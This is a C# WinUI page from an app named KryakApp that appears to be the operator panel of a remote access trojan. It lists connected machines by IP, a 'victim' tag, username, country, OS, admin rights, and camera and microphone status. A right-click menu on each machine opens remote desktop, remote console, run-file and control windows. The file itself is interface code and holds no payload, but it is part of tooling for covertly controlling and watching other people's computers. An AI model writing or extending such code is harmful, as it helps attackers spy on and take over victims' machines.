using KryakApp.Controls;
using KryakApp.Services;
using Microsoft.UI.Xaml.Controls;
using KryakApp.Windows;
using Microsoft.UI.Xaml;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;

namespace KryakApp.Pages
{
    public sealed partial class NodesPage : Page
    {
        private readonly List<Window> _openedWindows = [];
        private readonly Dictionary<UserData, List<Window>> _userWindows = [];

        public NodesPage()
        {
            InitializeComponent();

            SetupGrid();
            SetupGridEvents();

            if (App.MainWindow is not null)
            {
                App.MainWindow.Closed += MainWindow_Closed;
            }

            App.Server.UserDisconnected += Server_UserDisconnected;

            Unloaded += NodesPage_Unloaded;
        }

        private void SetupGrid()
        {
            PeopleGrid.Columns = new ObservableCollection<DataGridColumnDefinition>
            {
                new() { Header = "IP", PropertyName = nameof(UserData.UserIPAddress) },
                new() { Header = "Tag", PropertyName = nameof(UserData.VictimTag) },
                new() { Header = "Username", PropertyName = nameof(UserData.Username) },
                new() { Header = "Country", PropertyName = nameof(UserData.Country) },
                new() { Header = "OS", PropertyName = nameof(UserData.UserOS) },
                new() { Header = "Admin", PropertyName = nameof(UserData.AdminStatus) },
                new() { Header = "Cam", PropertyName = nameof(UserData.CameraStatus) },
                new() { Header = "Mic", PropertyName = nameof(UserData.MicrophoneStatus) },
                new() { Header = "Ping", PropertyName = nameof(UserData.Ping) }
            };

            PeopleGrid.Items = App.ConnectedUsers.Users;
        }

        private void SetupGridEvents()
        {
            PeopleGrid.RowRightClick += PeopleGrid_RowRightClick;
        }

        private void PeopleGrid_RowRightClick(object? sender, CustomDataGridRowRightClickEventArgs e)
        {
            if (e.RowItem is not UserData row)
            {
                return;
            }

            MenuFlyout menu = CreateRowMenu(row);
            ProtectedCursor = null;
            menu.ShowAt(PeopleGrid, e.Position);
        }

        private MenuFlyout CreateRowMenu(UserData row)
        {
            MenuFlyout menu = new();

            MenuFlyoutItem ManagerItem = new()
            {
                Text = "Manager",
                Icon = new SymbolIcon(Symbol.Contact)
            };
            ManagerItem.Click += (_, _) => Manager(row);

            MenuFlyoutItem RemoteDesktopItem = new()
            {
                Text = "Remote desktop",
                Icon = new SymbolIcon(Symbol.Remote)
            };
            RemoteDesktopItem.Click += (_, _) => RemoteDesktop(row);

            MenuFlyoutItem RemoteConsoleItem = new()
            {
                Text = "Remote console",
                Icon = new SymbolIcon(Symbol.AllApps)
            };
            RemoteConsoleItem.Click += (_, _) => RemoteConsole(row);

            MenuFlyoutItem RunFileItem = new()
            {
                Text = "Run file",
                Icon = new SymbolIcon(Symbol.OpenFile)
            };
            RunFileItem.Click += (_, _) => RunFile(row);

            MenuFlyoutItem ControlItem = new()
            {
                Text = "Control",
                Icon = new SymbolIcon(Symbol.World)
            };
            ControlItem.Click += (_, _) => Control(row);

            //menu.Items.Add(ManagerItem);
            menu.Items.Add(RemoteDesktopItem);
            menu.Items.Add(RemoteConsoleItem);
            menu.Items.Add(RunFileItem);
            menu.Items.Add(ControlItem);

            return menu;
        }

        private void Manager(UserData user)
        {

        }
        private void RemoteDesktop(UserData user)
        {
            OpenUserWindow(user, new RemoteDesktopWindow(user));
        }
        private void RemoteConsole(UserData user)
        {
            OpenUserWindow(user, new RemoteConsoleWindow(user));
        }
        private void RunFile(UserData user)
        {
            OpenUserWindow(user, new RunFileWindow(user));
        }
        private void Control(UserData user)
        {
            OpenUserWindow(user, new ClientControlWindow(user));
        }

        private void OpenUserWindow(UserData user, Window window)
        {
            window.Closed += ChildWindow_Closed;
            _openedWindows.Add(window);

            if (!_userWindows.TryGetValue(user, out List<Window>? windows))
            {
                windows = [];
                _userWindows[user] = windows;
            }

            windows.Add(window);
            window.Activate();
        }

        private void ChildWindow_Closed(object sender, WindowEventArgs args)
        {
            if (sender is Window window)
            {
                _openedWindows.Remove(window);

                List<UserData> emptyUsers = [];
                foreach (KeyValuePair<UserData, List<Window>> pair in _userWindows)
                {
                    pair.Value.Remove(window);
                    if (pair.Value.Count == 0)
                    {
                        emptyUsers.Add(pair.Key);
                    }
                }

                foreach (UserData user in emptyUsers)
                {
                    _userWindows.Remove(user);
                }
            }
        }

        private void Server_UserDisconnected(UserData user)
        {
            if (!DispatcherQueue.HasThreadAccess)
            {
                DispatcherQueue.TryEnqueue(() => Server_UserDisconnected(user));
                return;
            }

            if (!_userWindows.TryGetValue(user, out List<Window>? windows))
            {
                return;
            }

            List<Window> snapshot = [.. windows];
            foreach (Window window in snapshot)
            {
                window.Close();
            }

            _userWindows.Remove(user);
        }

        private void MainWindow_Closed(object sender, WindowEventArgs args)
        {
            for (int i = _openedWindows.Count - 1; i >= 0; i--)
            {
                _openedWindows[i].Close();
            }

            _openedWindows.Clear();
            _userWindows.Clear();
        }

        private void NodesPage_Unloaded(object sender, RoutedEventArgs e)
        {
            if (App.MainWindow is not null)
            {
                App.MainWindow.Closed -= MainWindow_Closed;
            }

            App.Server.UserDisconnected -= Server_UserDisconnected;

            Unloaded -= NodesPage_Unloaded;
        }
    }
}
